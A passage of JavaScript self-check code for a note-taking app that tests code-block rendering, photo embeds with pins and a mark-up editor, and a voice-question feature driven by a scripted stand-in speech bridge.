  const cbNote = () => { const n = note(); clearTimeout(n.saveT); n.md = 'Before the code.\n\n```js\n// a comment\nconst total = items.reduce((sum, x) => sum + x.price * 2, 0);\nconsole.log("total", total);\n```\n\nAfter.'; n.html = null; n.docDirty = false; S.mode = 'wysiwyg'; renderAll(); };
  for (const sc of Object.keys(SCREENS)) {
    set({ screen: sc, sample: 'typical', view: 'notes', modal: null }); cbNote(); out.combos++;
    const pre = app.querySelector('.doc pre.cb'), head = pre?.querySelector('.cb-head'), gut = pre?.querySelector('.cb-gut');
    if (!pre || !head) { bad('code block not drawn', sc); continue; }
    measure(`buildv-code/${sc}`);
    const hs = [...head.querySelectorAll('button')].map(b => b.offsetHeight); if (head.offsetHeight !== 32 || hs.some(h => ![24, 28].includes(h))) bad('code block head off the scale', `${sc}: head ${head.offsetHeight}, buttons ${hs}`);
    const pr = pre.getBoundingClientRect(), hr = head.getBoundingClientRect(); if (hr.right > pr.right + .5 || hr.left < pr.left - .5) bad('code block head outside its block', sc);
    if (gut?.dataset.nums !== '1\n2\n3') bad('code block line numbers', `${sc}: ${JSON.stringify(gut?.dataset.nums)}`);
    if (sc === '1366x768') B.code.screen = `head ${head.offsetHeight}px, buttons ${hs.join('/')}, ${pre.querySelectorAll('[class^="hljs-"], [class*=" hljs-"]').length} coloured spans`;
  }
  { // QC 104: "N problems" is a button with a list of them all (each with its line); a click jumps to the line and lights it up;
    // a dot in the gutter beside each line with a problem; the dotted underline stays
    set({ screen: '1366x768', sample: 'typical', view: 'notes', modal: null }); out.combos++;
    const n = note(); clearTimeout(n.saveT); n.md = '```python\ndef greet(name):\n    print(f"Hello, {name}!")\n\nnumbers = [1, 2, 3\n\nx = (1 + 2\ntotal = sum(numbers)\n```'; n.html = null; n.docDirty = false; S.mode = 'wysiwyg'; renderAll();
    await new Promise(r => setTimeout(r, 30));
    const pre = app.querySelector('.doc pre.cb'), btn = pre?.querySelector('.cb-head .cb-note'), f = [];
    if (!btn || btn.tagName !== 'BUTTON' || btn.getAttribute('aria-haspopup') !== 'menu' || btn.dataset.label !== '2 problems') f.push(`the head’s problems: ${btn?.outerHTML.slice(0, 120)}`);
    const marks = [...(pre?.querySelectorAll('.cb-gut .cb-gmark') || [])], unders = [...(pre?.querySelectorAll('.cb-issue') || [])];
    if (marks.length !== 2 || unders.length !== 2) f.push(`${marks.length} gutter dots, ${unders.length} underlines`);
    else marks.forEach((m, i) => { const a = m.getBoundingClientRect(), u = unders[i].getBoundingClientRect(); if (Math.abs((a.top + a.height / 2) - (u.top + u.height / 2)) > u.height) f.push(`dot ${i + 1} isn’t on its line`); });
    btn?.click(); await new Promise(r => setTimeout(r, 10));
    const menu = app.querySelector(':scope > .cb-probmenu'), items = [...(menu?.querySelectorAll('[data-cb-prob]') || [])].map(b => b.textContent);
    if (items.join('|') !== 'Line 4a [ is never closed|Line 6a ( is never closed' || btn?.getAttribute('aria-expanded') !== 'true') f.push(`the list: ${items.join(' | ') || 'not open'}`);
    menu?.querySelectorAll('[data-cb-prob]')[1]?.click(); await new Promise(r => setTimeout(r, 10));
    const code = pre?.querySelector('code'), sel = code && cbSel(code), want = n.md.split('\n').slice(1).join('\n').indexOf('(1 + 2');
    if (app.querySelector(':scope > .cb-probmenu') || !sel || sel[0] !== want || !pre.querySelector('.cb-flash')) f.push(`the jump: caret ${sel}, wanted ${want}, flash ${!!pre?.querySelector('.cb-flash')}`);
    B.code.problems = f.length ? f.join('; ') : `a button “2 problems” → ${items.length} lines listed, 2 gutter dots on their lines, a pick puts the caret on line 6 and lights it`;
    if (f.length) bad('code block problems (QC 104)', f.join('; '));
    set({ modal: null });
  }
  for (const [th] of THEMES) {
    set({ screen: '1920x1080', theme: th, sample: 'typical', view: 'notes', modal: null }); cbNote(); out.combos++;
    const pre = app.querySelector('.doc pre.cb'), bg = getComputedStyle(pre).backgroundColor, low = [];
    [['keyword', '.hljs-keyword'], ['string', '.hljs-string'], ['number', '.hljs-number'], ['function', '.hljs-title, .hljs-built_in'], ['comment', '.hljs-comment'], ['numbers', '.cb-gut'], ['language', '.cb-lang']].forEach(([k, sel]) => {
      const el = pre?.querySelector(sel); if (!el) { low.push(k + ' missing'); return; } const r = ratio(getComputedStyle(el).color, bg); if (r < 4.5) low.push(`${k} ${r}:1`); });
    B.code[th] = low.length ? low.join(', ') : 'all ≥ 4.5:1';
    if (low.length) bad('code colours under AA', `${th}: ${low.join(', ')}`);
  }
  set({ theme: keep.reader.theme, sample: 'typical', modal: null });   // the screen itself is checked above (VSTATE.ask)

  // 8 · R59 photos: the caption and pins, the picked photo's bar (inside the photo, icon-only tools with our tooltip), the mark-up
  //     window on four screens, and Settings → Editor → Text with photos
  B.photos = {};
  const PF = 'attachments/paste-20261014-101233.png', tick = (ms = 30) => new Promise(r => setTimeout(r, ms));
  const phNote = () => { PLAYER.urls[PF] = 'data:image/svg+xml,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="480" height="270"><rect width="480" height="270" fill="#9ab"/></svg>');
    const n = note(); clearTimeout(n.saveT); n.md = `Before.\n\n![[${PF}]]\n*Tuesday’s whiteboard: the token flow*\n\n<!-- nv-pins 24.0,30.0 70.0,30.0 70.0,70.0 -->\n\n1. The access token\n2. The API checks it\n3. A new token`; n.html = null; n.docDirty = false; S.mode = 'wysiwyg'; PH.sel = null; PHE.ed = null; renderAll(); };
  for (const sc of Object.keys(SCREENS)) {
    set({ screen: sc, sample: 'typical', view: 'notes', modal: null }); phNote(); await tick(60); out.combos++;
    const doc = app.querySelector('.doc'), box = doc?.querySelector(`.att-img[data-embed-for="${PF}"]`), img = box?.querySelector('img'), f = [];
    if (!box || !img) { bad('photo not drawn', sc); continue; }
    const ir = img.getBoundingClientRect(), pins = [...box.querySelectorAll('.ph-pin')];
    if (pins.length !== 3) f.push(`${pins.length} pins`);
    if (pins.some(p => { const r = p.getBoundingClientRect(), cx = r.left + r.width / 2, cy = r.top + r.height / 2; return cx < ir.left - 1 || cx > ir.right + 1 || cy < ir.top - 1 || cy > ir.bottom + 1; })) f.push('a pin off the picture');
    const cap = doc.querySelector('p.ph-cap-p'); if (!cap || cap.getBoundingClientRect().top < ir.bottom - 1 || !/Tuesday/.test(cap.textContent)) f.push('the caption isn’t under the photo');
    if (!doc.querySelector('ol.ph-pinlist')) f.push('the pins’ list isn’t marked');
    PH.sel = { doc, box, file: PF }; phDecorate(doc); await tick();
    const bar = box.querySelector('.ph-bar'), br = bar?.getBoundingClientRect();
    if (!bar) f.push('no bar'); else {
      if (br.left < ir.left - 1 || br.right > ir.right + 1) f.push(`the bar is wider than the photo (${Math.round(br.width)} > ${Math.round(ir.width)})`);
      const icons = [...bar.querySelectorAll('.icon-btn')]; if (icons.length !== 5 || icons.some(b => !b.dataset.tip || !b.getAttribute('aria-label') || b.hasAttribute('title'))) f.push('icon-only tools: 5, each with our tooltip and a name, no native title');
      if ([...bar.querySelectorAll('.btn:not(.icon-btn)')].some(b => b.dataset.tip)) f.push('a named button with a tooltip');
      const hs = [...bar.querySelectorAll('button')].map(b => b.offsetHeight); if (hs.some(h => ![24, 28].includes(h))) f.push(`bar controls ${hs}`); }
    measure(`buildv-photo/${sc}`);
    await pheOpenEditor(doc, PF); await tick(60);
    const ed = app.querySelector('.phe-ed'), er = ed?.getBoundingClientRect(), a = app.getBoundingClientRect();
    if (!ed) f.push('no mark-up window'); else {
      if (er.left < a.left - 1 || er.right > a.right + 1 || er.top < a.top - 1 || er.bottom > a.bottom + 1) f.push('the window is outside the app');
      if (ed.querySelectorAll('[data-phe-tool]').length !== 8 || ed.querySelectorAll('[data-phe-colour]').length !== 3) f.push('tools or colours');
      if (!/original stays as it was/.test(ed.textContent)) f.push('no “the original stays”');
      const cv = ed.querySelector('canvas').getBoundingClientRect(); if (!cv.width || cv.right > er.right + 1) f.push('the canvas doesn’t fit');
      const hs = [...ed.querySelectorAll('.btn, .icon-btn')].filter(b => b.offsetParent).map(b => b.offsetHeight); if (hs.some(h => ![24, 28, 32, 36].includes(h))) f.push(`window controls ${[...new Set(hs)]}`);
      // QC 99: the tools in one row (colours inline, the zoom at the end); the photo's area is ≥ 70% of the body; 920 px or the app's width
      const tb = ed.querySelector('.phe-tools'), items = [...tb.querySelectorAll('button')].map(b => b.getBoundingClientRect()), ys = items.map(r => r.top + r.height / 2);
      if (Math.max(...ys) - Math.min(...ys) > 3 || tb.scrollWidth > tb.clientWidth + 1 || !tb.querySelector('[data-phe-colour]') || !tb.querySelector('[data-phe-zoom="fit"]')) f.push('the tools aren’t one row');
      const body = ed.querySelector('.phe-ed-body').getBoundingClientRect(), stg = ed.querySelector('.phe-stage'), sr = stg.getBoundingClientRect(), share = sr.width * sr.height / (body.width * body.height);
      if (share < .7) f.push(`the photo’s area is ${Math.round(share * 100)}% of the body`);
      if (ed.dataset.size !== 'wide' || er.width > 921 || er.width < Math.min(920, a.width - 64) - 1) f.push(`the window isn’t the wide dialog (${ed.dataset.size}, ${Math.round(er.width)}px)`);   // round C: one of the three sizes
      if (!/^Will be saved as a copy, .+ \(edited\)\.png\. The original stays as it was\.$/.test(ed.querySelector('.phe-note')?.textContent || '')) f.push(`the footer: ${ed.querySelector('.phe-note')?.textContent}`);
      { const pk = ed.querySelector('[data-phe-tool][aria-pressed="true"]'), cs = pk && getComputedStyle(pk);   // round C: picked = a fill only
        if (!pk || document.activeElement?.closest?.('.phe-tools') || cs.boxShadow !== 'none' || (cs.outlineStyle !== 'none' && parseFloat(cs.outlineWidth) > 0) || cs.backgroundColor === 'rgba(0, 0, 0, 0)') f.push('the picked tool isn’t a fill only'); }
      const inStage = () => { const c = stg.querySelector('canvas').getBoundingClientRect(); return c.left >= sr.left - 1 && c.right <= sr.right + 1 && c.top >= sr.top - 1 && c.bottom <= sr.bottom + 1; };
      if (!inStage()) f.push('the photo isn’t fitted in its area');
      // a big photo: Fit shows all of it, touching two sides; 100% scrolls; Fit again
      PHE.ed.base = Object.assign(document.createElement('canvas'), { width: 3000, height: 2000 }); renderAll(); await tick();
      { const c = app.querySelector('.phe-ed canvas').getBoundingClientRect(), s2 = app.querySelector('.phe-ed .phe-stage'), r2 = s2.getBoundingClientRect(), cs = getComputedStyle(s2), pw = parseFloat(cs.paddingLeft) * 2, ph = parseFloat(cs.paddingTop) * 2;
        if (!(c.left >= r2.left - 1 && c.right <= r2.right + 1 && c.top >= r2.top - 1 && c.bottom <= r2.bottom + 1) || (Math.abs(c.width - (r2.width - pw)) > 3 && Math.abs(c.height - (r2.height - ph)) > 3)) f.push(`a big photo isn’t fitted (${Math.round(c.width)}×${Math.round(c.height)} in ${Math.round(r2.width)}×${Math.round(r2.height)})`);
        app.querySelector('.phe-ed [data-phe-zoom="100"]').click(); await tick(); const s3 = app.querySelector('.phe-ed .phe-stage');
        if (app.querySelector('.phe-ed .phe-zl').textContent !== '100%' || s3.scrollWidth <= s3.clientWidth) f.push('100% doesn’t show the photo at full size');
        app.querySelector('.phe-ed [data-phe-zoom="fit"]').click(); await tick(); if (PHE.ed.zoom != null) f.push('Fit doesn’t go back'); }
      B.photos['window-' + sc] = `tools in one row, photo area ${Math.round(share * 100)}% of the body, window ${Math.round(er.width)}px`;
      measure(`buildv-photo-window/${sc}`); }
    PHE.ed = null; PH.sel = null; renderAll();
    if (f.length) bad('photos', `${sc}: ${f.join('; ')}`);
    B.photos[sc] = f[0] || `3 pins on the picture, caption under it, bar ${Math.round(br?.width || 0)}px inside ${Math.round(ir.width)}px, window ${Math.round(er?.width || 0)}×${Math.round(er?.height || 0)}`;
  }
  { openSettings('editor'); out.combos++; const pane = app.querySelector('.settings-pane'), opts = [...(pane?.querySelectorAll('[data-act="ph-mode"]') || [])].map(b => b.textContent.trim());
    B.photos.setting = opts.join(' · '); if (opts.join('|') !== 'Caption and pins|Captions only|Pins only|Neither' || pane.querySelector('[data-act="ph-mode"][aria-pressed="true"]')?.dataset.v !== PH.mode) bad('photos: the setting', B.photos.setting);
    set({ modal: null }); }
  set({ sample: 'typical', modal: null });

  saveSettings = keepSave; AI.st = null; AI.demo = false; SETUP.info = null; Object.assign(VSTATE, vs0); SETUP.open = false; S.ob.step = 'vault'; app.classList.remove('is-setup'); set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null }); S.toast = null;
}
/* ==== end Build V ==== */
/* ==== Build N · R69: speaking a question in Ask, the Agent and the floating window (ask-voice.js, api.ask_voice_*) ====
   The speech engine is a stand-in (a scripted ask_voice_* bridge): no microphone, no model, no cloud call. Covers Settings → Voice (the
   two settings, a plain line each, saved), the three start modes (tap, hold with the mouse and Ctrl+Space, auto after 1.5 s of quiet),
   the words sent at once (to Ask, to the Agent, from the floating window), the hint and where-heard line while listening, the long
   question's pill, Esc, the cards (no microphone, no speech model, nothing heard, no key) and the cloud first-use question.
   Alone: ?check=1&only=buildn ==== */
async function checkAskVoice() {
  const V = out.numbers.r69 = {}, bad = (k, v) => iss('R69 ' + k, v);
  const tick = (n = 4) => new Promise(r => { let i = 0; const f = () => ++i >= n ? r() : setTimeout(f, 0); setTimeout(f, 0); });
  const until = async (f, n = 80) => { for (let i = 0; i < n && !f(); i++) await tick(3); return f(); };
  const withApi = async (fake, fn) => { const was = window.pywebview, calls = [];
    window.pywebview = { api: new Proxy({}, { get: (_, n) => typeof n !== 'string' || n === 'then' ? undefined : (...a) => { calls.push([n, a]); return Promise.resolve(fake[n] ? fake[n](...a) : { status: 'success' }); } }) };
    try { await fn(calls); } finally { window.pywebview = was; } return calls; };
  const txt = el => { const parts = []; const walk = n => { if (n.nodeType === 3) parts.push(n.textContent); else if (n.nodeType === 1 && !/^(svg|style|script)$/i.test(n.tagName)) { const blk = getComputedStyle(n).display !== 'inline'; if (blk) parts.push(' '); n.childNodes.forEach(walk); if (blk) parts.push(' '); } };   // a block or a flex item starts a new word; inline text (a key cap) does not
    if (el) walk(el); return parts.join('').replace(/\s+/g, ' ').trim(); };
  const E = { stage: 'idle', secs: 0, heard: false, quiet: null, words: '', text: 'what is left on the accessibility audit', held: false, n: 0, seen: false, present: true, nothing: false, start: null };
  const okStart = () => { E.stage = 'recording'; return { status: 'success', where: AVX.where, max_seconds: 120 }; };
  E.start = okStart;
  const fake = (o = {}) => ({
    ask_voice_status: () => ({ status: 'success', start: AVX.start, where: AVX.where, model: { name: 'base.en', present: E.present, size_mb: 161 }, mic_ok: true, mic_error: '', cloud: { id: 'groq', name: 'Groq', model: 'Whisper large-v3', has_key: true, seen: E.seen },
      stage: 'idle', download: E.present ? { stage: 'done', message: 'ok' } : {} }),
    voice_status: () => ({ status: 'success', model: { name: 'base.en', present: E.present, size_mb: 161 }, models: [], mics: [], download: { stage: 'done', message: 'ok' } }),
    ask_voice_start: () => E.start(),
    ask_voice_poll: () => {
      if (E.stage === 'recording') return { status: 'success', stage: 'recording', seconds: E.secs, bars: Array.from({ length: 24 }, (_, i) => (i % 5) / 5), words: E.words, heard: E.heard, quiet: E.quiet, full: false };
      if (E.stage === 'transcribing') { if (E.held || ++E.n < 2) return { status: 'success', stage: 'transcribing' }; E.stage = 'done'; }
      if (E.stage === 'done') return E.nothing ? { status: 'success', stage: 'error', code: 'nothing', message: 'Nothing was heard.' } : { status: 'success', stage: 'done', result: { text: E.text, seconds: 3 } };
      return { status: 'success', stage: 'idle' }; },
    ask_voice_stop: () => { E.stage = 'transcribing'; E.n = 0; return { status: 'success' }; },
    ask_voice_discard: () => { E.stage = 'idle'; return { status: 'success' }; },
    ask_voice_cloud_yes: y => { E.seen = y === true; return { status: 'success', seen: E.seen }; },
    ai_ask: () => ({ status: 'success', job: 'v1' }), ai_job: () => ({ status: 'success', state: 'done', result: { answer: 'Two things are left.', by: 'Qwen3.5 4B' } }), ...o });
  const resetE = () => { Object.assign(E, { stage: 'idle', secs: 0, heard: false, quiet: null, words: '', held: false, n: 0, seen: false, present: true, nothing: false }); E.start = okStart; };
  const resetAVX = () => { avxClear(); Object.assign(AVX, { start: 'tap', where: 'pc', seen: false, info: null, loading: false, stage: 'idle', secs: 0, bars: [], words: '', heard: false, note: null, first: null, seq: AVX.seq + 1, noteId: null, hold: null, rel: false, spoken: null, long: false, dl: null }); };
  const resetAIC = () => Object.assign(AIC, { open: false, mode: 'dock', rect: null, esc: 'stop', scope: 'note', chats: {}, drafts: {}, busy: null, menu: null, unread: false, caret: null, follow: 'note', hist: 'whole', histN: 6, newHow: 'fresh', aiOn: true, past: {}, viewing: null, toTop: false });
  const keep = { st: AI.st, demo: AI.demo, agt: { on: AGT.on, tools: AGT.tools }, ask: agtAsk };
  const key = (type, o, target = document) => target.dispatchEvent(new KeyboardEvent(type, { bubbles: true, cancelable: true, ...o }));
  const ptr = (type, el = document) => el.dispatchEvent(new PointerEvent(type, { bubbles: true, cancelable: true, button: 0, pointerId: 1 }));
  const mic = () => app.querySelector('.avx-mic');
  const open = async () => { if (!AIC.open) { app.querySelector('[data-act="ain-ask"]').click(); await tick(); } else renderAll(); await until(() => AVX.info); await tick(); };
  const sent = calls => calls.filter(c => c[0] === 'ai_ask').map(c => c[1][0]);
  const listen = async () => { mic().click(); await until(() => AVX.stage === 'listening'); await tick(); };
  set({ screen: '1920x1080', theme: 'obsidian', font: 'system', sample: 'typical', view: 'notes', side: true, inspector: 'shown', widgets: 'none', zen: 'off', modal: null });
  resetAIC(); resetAVX(); resetE();
  try {
    aiDemo('ready'); AIC.mode = 'dock'; renderAll();
    // 1 · Settings → Voice: "Start and stop" and "Where your words are heard", a plain line each, right under the speech-to-text rows
    await withApi(fake(), async calls => {
      openSettings('voice'); await until(() => app.querySelector('[data-avx-row="start"]')); await tick();
      const r1 = app.querySelector('[data-avx-row="start"]'), r2 = app.querySelector('[data-avx-row="where"]'), s1 = r1?.querySelector('select'), s2 = r2?.querySelector('select');
      V.settings = `${txt(r1?.querySelector('.set-label'))} · ${[...(s1?.options || [])].map(o => o.text).join(' | ')} · ${txt(r1?.querySelector('.set-desc'))} || ${txt(r2?.querySelector('.set-label'))} · ${[...(s2?.options || [])].map(o => o.text).join(' | ')} · ${txt(r2?.querySelector('.set-desc'))}`;
      if (txt(r1?.querySelector('.set-label')) !== 'Start and stop' || [...(s1?.options || [])].map(o => o.text).join('|') !== 'Tap to start and stop|Hold to talk, or Ctrl+Space|Tap once, stops by itself after a pause' || s1.value !== 'tap'
        || txt(r1.querySelector('.set-desc')) !== 'Tap to start, tap again to stop: one click each way, nothing to hold.') bad('Start and stop: the label, the three choices (tap is the default) and its line', V.settings);
      if (txt(r2?.querySelector('.set-label')) !== 'Where your words are heard' || [...(s2?.options || [])].map(o => o.text).join('|') !== 'On this PC|A cloud model such as Groq' || s2.value !== 'pc'
        || txt(r2.querySelector('.set-desc')) !== 'On this PC: the speech model you already have (base.en). Nothing you say leaves the PC; a little slower.') bad('Where your words are heard: the label, the two choices (this PC is the default) and its line', V.settings);
      if (!r1?.previousElementSibling?.querySelector('[data-act="voice-mic"]')) bad('the two rows sit right under the speech-to-text rows (after Microphone)', txt(r1?.previousElementSibling));
      s1.value = 'hold'; s1.dispatchEvent(new Event('change', { bubbles: true })); await tick();
      const w2 = app.querySelector('[data-avx-set="where"]'); w2.value = 'cloud'; w2.dispatchEvent(new Event('change', { bubbles: true })); await tick();
      const saved = calls.filter(c => c[0] === 'save_settings').map(c => JSON.stringify(c[1][0])).join(' ');
      V.saved = saved + ' · ' + txt(app.querySelector('[data-avx-desc="start"]')) + ' · ' + txt(app.querySelector('[data-avx-desc="where"]'));
      if (!/"ask_voice_start":"hold"/.test(saved) || !/"ask_voice_where":"cloud"/.test(saved) || AVX.start !== 'hold' || AVX.where !== 'cloud') bad('a change is saved (ask_voice_start, ask_voice_where)', V.saved);
      if (txt(app.querySelector('[data-avx-desc="start"]')) !== 'Hold to talk, like a walkie-talkie, with the mouse or Ctrl+Space; let go to finish.' || !/^A cloud model \(Groq, Whisper large-v3\): quicker on an older PC\. Your recording goes to Groq, after a first-use yes\./.test(txt(app.querySelector('[data-avx-desc="where"]')))) bad('each line follows its choice', V.saved);
      measure('R69 settings'); set({ modal: null }); });
    resetAVX(); resetE();
    // 2 · Tap to start and stop: the mic beside send, the hint and where it is heard; listening shows the live words; tap again sends at once
    await withApi(fake(), async calls => {
      await open();
      const m = mic(), send = app.querySelector('.aic-send'), row = m?.parentElement;
      V.idle = `${m?.getAttribute('aria-label')} · "${txt(app.querySelector('.avx-hint'))}"`;
      if (!m || m.nextElementSibling !== send || row !== send.parentElement) bad('the mic sits right beside send, in the input row', V.idle);
      if (m?.getAttribute('aria-label') !== 'Speak: tap to start, tap again to stop' || m.dataset.tip !== m.getAttribute('aria-label')) bad('the mic’s name and tooltip', V.idle);
      if (txt(app.querySelector('.avx-hint')) !== 'Tap the mic, speak, then tap it again. Heard on this PC (base.en) · nothing you say leaves it') bad('the idle hint and where the words are heard', V.idle);
      if (app.querySelector('.avx-hint .avx-where') == null || app.querySelector('.avx-hint').nextElementSibling) bad('the hint is under the box', '');
      E.secs = 0.3; await listen();
      E.secs = 3; E.heard = true; E.quiet = 0; E.words = 'what is left on the'; await until(() => /what is left on the/.test(txt(app.querySelector('[data-avx-words]'))));
      V.listening = `${m ? mic().getAttribute('aria-label') : ''} · live "${txt(app.querySelector('.avx-live'))}" · ${txt(app.querySelector('.avx-hint'))} · ph "${app.querySelector('#aic-in')?.placeholder}"`;
      const live = app.querySelector('.avx-live');
      if (!live || !live.querySelector('.vpill-dot') || live.querySelectorAll('.avx-wave i').length !== 22 || txt(live.querySelector('[data-avx-time]')) !== '0:03' || !/what is left on the$/.test(txt(live.querySelector('[data-avx-words]')))) bad('listening: the clock, the moving line and the live words', V.listening);
      if (!mic().classList.contains('is-rec') || mic().getAttribute('aria-pressed') !== 'true' || mic().getAttribute('aria-label') !== 'Stop: tap to finish' || !mic().querySelector('svg')) bad('listening: the mic is on (red, pressed) and says how to stop', V.listening);
      if (txt(app.querySelector('.avx-hint')) !== 'Tap the mic again to finish. Heard on this PC (base.en) · nothing you say leaves it') bad('listening: how to finish and where the words are heard', V.listening);
      if (app.querySelector('#aic-in').placeholder !== 'Listening…') bad('listening: the box says Listening…', V.listening);
      const bars = [...app.querySelectorAll('.avx-wave i')].map(i => i.style.height); if (new Set(bars).size < 3) bad('the moving line follows the level', bars.join());
      measure('R69 listening');
      mic().click(); await until(() => calls.some(c => c[0] === 'ai_ask'));
      const asked = calls.map(c => c[0]).filter(x => /ask_voice_(start|stop)|ai_ask/.test(x)).join(' > ');
      V.sent = `${asked} · "${sent(calls)[0]}"`;
      if (asked !== 'ask_voice_start > ask_voice_stop > ai_ask' || sent(calls)[0] !== E.text) bad('stopping sends the words at once, with no Send press', V.sent);
      await until(() => !AIC.busy); await tick(3);
      const q = app.querySelector('.aic-q');
      V.spoken = `${txt(q)} · draft "${AIC.drafts[aicKey(note())]}"`;
      if (!/^what is left on the accessibility audit spoken$/.test(txt(q)) || !q.querySelector('.avx-qmic svg') || (AIC.drafts[aicKey(note())] || '') !== '') bad('the question says it was spoken, and the box is empty', V.spoken);
      // words already typed go with it
      E.stage = 'idle'; E.heard = false; E.quiet = null; AIC.drafts[aicKey(note())] = 'Also,'; renderAll(); await listen(); E.secs = 2; E.heard = true; E.quiet = 0; await until(() => AVX.secs === 2); mic().click(); await until(() => sent(calls).length === 2);
      if (sent(calls)[1] !== 'Also, ' + E.text) bad('words already typed go with the spoken ones', sent(calls)[1]); });
    // 3 · Hold to talk: the mic with the mouse, and Ctrl+Space; a quick tap is not a question; a key press toggles
    resetAVX(); resetE(); AIC.chats = {}; AIC.drafts = {}; AVX.start = 'hold';
    await withApi(fake(), async calls => {
      renderAll(); await open();
      V.holdHint = txt(app.querySelector('.avx-hint'));
      if (txt(app.querySelector('.avx-hint')) !== 'Hold the mic, or hold Ctrl+Space, and let go when you’re done. Heard on this PC (base.en) · nothing you say leaves it' || app.querySelectorAll('.avx-hint kbd').length !== 2) bad('hold: the idle hint names the mic and Ctrl+Space', V.holdHint);
      if (mic().getAttribute('aria-label') !== 'Speak: hold to talk, or hold Ctrl+Space') bad('hold: the mic’s name', mic().getAttribute('aria-label'));
      E.secs = 1.2; ptr('pointerdown', mic()); await until(() => AVX.stage === 'listening'); await until(() => AVX.secs >= 1.2);
      V.holdListening = `${mic().getAttribute('aria-label')} · ${txt(app.querySelector('.avx-hint'))} · icon ${mic().querySelector('svg')?.innerHTML.slice(0, 20)}`;
      if (txt(app.querySelector('.avx-hint')) !== 'Let go of the mic, or of Ctrl+Space, to finish. Heard on this PC (base.en) · nothing you say leaves it' || mic().getAttribute('aria-label') !== 'Let go to finish') bad('hold: listening says to let go', V.holdListening);
      ptr('pointerup'); await until(() => sent(calls).length === 1);
      if (sent(calls)[0] !== E.text) bad('hold: letting go sends the words at once', sent(calls)[0]);
      await until(() => !AIC.busy); E.stage = 'idle';
      // a quick tap (let go before 0.4 s) is dropped, not sent
      E.secs = 0.1; ptr('pointerdown', mic()); ptr('pointerup'); await until(() => calls.some(c => c[0] === 'ask_voice_discard')); await tick(6);
      if (sent(calls).length !== 1 || AVX.stage !== 'idle' || !/Hold the mic while you speak/.test(S.status)) bad('hold: a quick tap is not a question', `${sent(calls).length} sent · ${AVX.stage} · ${S.status}`);
      E.stage = 'idle'; await until(() => AVX.stage === 'idle');
      // Ctrl+Space from the box
      const ta = app.querySelector('#aic-in'); E.secs = 1.5; key('keydown', { key: ' ', code: 'Space', ctrlKey: true }, ta); await until(() => AVX.stage === 'listening'); await until(() => AVX.secs >= 1.5);
      key('keyup', { key: ' ', code: 'Space' }); await until(() => sent(calls).length === 2);
      if (sent(calls)[1] !== E.text) bad('hold: Ctrl+Space down starts, up sends', `${sent(calls)[1]} · stage ${AVX.stage} hold ${AVX.hold} busy ${!!AIC.busy} · ${calls.map(c => c[0]).join(',')}`);
      await until(() => !AIC.busy); E.stage = 'idle';
      // a key press on the mic (no mouse) toggles, so the keyboard needs no holding
      E.secs = 2; mic().click(); await until(() => AVX.stage === 'listening'); await until(() => AVX.secs >= 2); mic().click(); await until(() => sent(calls).length === 3);
      if (sent(calls).length !== 3) bad('hold: Enter or Space on the mic starts, and again stops', sent(calls).length);
      await until(() => !AIC.busy); E.stage = 'idle';
      // Ctrl+Space does nothing in the other modes
      AVX.start = 'tap'; renderAll(); const n0 = calls.filter(c => c[0] === 'ask_voice_start').length; key('keydown', { key: ' ', code: 'Space', ctrlKey: true }, app.querySelector('#aic-in')); await tick(6);
      if (calls.filter(c => c[0] === 'ask_voice_start').length !== n0) bad('Ctrl+Space only works in hold mode', ''); });
    // 4 · Tap once, it stops by itself after 1.5 s of quiet (and not before)
    resetAVX(); resetE(); AIC.chats = {}; AIC.drafts = {}; AVX.start = 'auto';
    await withApi(fake(), async calls => {
      renderAll(); await open();
      if (txt(app.querySelector('.avx-hint')) !== 'Tap the mic and speak: it stops by itself after 1.5 s of quiet. Heard on this PC (base.en) · nothing you say leaves it' || mic().getAttribute('aria-label') !== 'Speak: it stops by itself after a pause') bad('auto: the idle hint and the mic’s name', txt(app.querySelector('.avx-hint')));
      E.secs = 2; E.heard = true; E.quiet = 0; E.words = 'what is left'; await listen();
      V.autoHint = `${mic().getAttribute('aria-label')} · ${txt(app.querySelector('.avx-hint'))}`;
      if (txt(app.querySelector('.avx-hint')) !== 'Stops by itself after 1.5 s of quiet · or tap the mic. Heard on this PC (base.en) · nothing you say leaves it' || !app.querySelector('.avx-hint .avx-pause') || mic().getAttribute('aria-label') !== 'Listening: stops by itself after a pause') bad('auto: listening says it stops by itself', V.autoHint);
      E.quiet = 1.2; E.secs = 4; await until(() => AVX.secs === 4); await tick(10);
      if (calls.some(c => c[0] === 'ask_voice_stop')) bad('auto: 1.2 s of quiet is not enough', '');
      E.quiet = 1.5; await until(() => sent(calls).length === 1, 200);
      V.autoSent = `${calls.map(c => c[0]).filter(x => /ask_voice_(start|stop)|ai_ask/.test(x)).join(' > ')} · "${sent(calls)[0]}"`;
      if (sent(calls)[0] !== E.text || !calls.some(c => c[0] === 'ask_voice_stop')) bad('auto: 1.5 s of quiet stops it and sends the words, with no click', V.autoSent);
      await until(() => !AIC.busy); E.stage = 'idle';
      // never spoke: it gives up after a few seconds and says nothing was heard, with Try again
      Object.assign(E, { heard: false, quiet: null, secs: 0.5, nothing: true }); await listen(); E.secs = 8; await until(() => AVX.note?.kind === 'nothing', 200); await tick(3);
      V.nothing = txt(app.querySelector('[data-avx-note="nothing"]'));
      if (V.nothing !== 'Nothing was heard It was too quiet, or too noisy to make out words. Check the microphone is on, or move somewhere quieter. Try again' || app.querySelector('[data-avx-note]').getAttribute('role') !== 'alert') bad('nothing heard: the card and Try again', V.nothing);
      E.nothing = false; E.text = 'second try'; E.secs = 1; app.querySelector('[data-act="avx-retry"]').click(); await until(() => AVX.stage === 'listening');
      if (app.querySelector('[data-avx-note]')) bad('Try again clears the card and listens', ''); mic().click(); await until(() => sent(calls).length === 2); E.text = 'what is left on the accessibility audit'; });
    // 5 · Esc while listening drops what was said (nothing is sent, the chat stays); a long question gets the pill with Stop and Discard
    resetAVX(); resetE(); AIC.chats = {}; AIC.drafts = {};
    await withApi(fake(), async calls => {
      await open(); E.secs = 1; await listen();
      key('keydown', { key: 'Escape' }, app.querySelector('#aic-in')); await until(() => calls.some(c => c[0] === 'ask_voice_discard')); await tick(4);
      V.esc = `${AVX.stage} · chat open ${AIC.open} · sent ${sent(calls).length} · "${S.status}"`;
      if (AVX.stage !== 'idle' || !AIC.open || sent(calls).length || !app.querySelector('.aic-win')) bad('Esc while listening discards it and keeps the chat open', V.esc);
      E.stage = 'idle'; E.secs = 25; E.heard = true; E.quiet = 0; E.words = 'and then the retests, which Maya said were not in the budget'; await listen(); await until(() => app.querySelector('.avx-pill'));
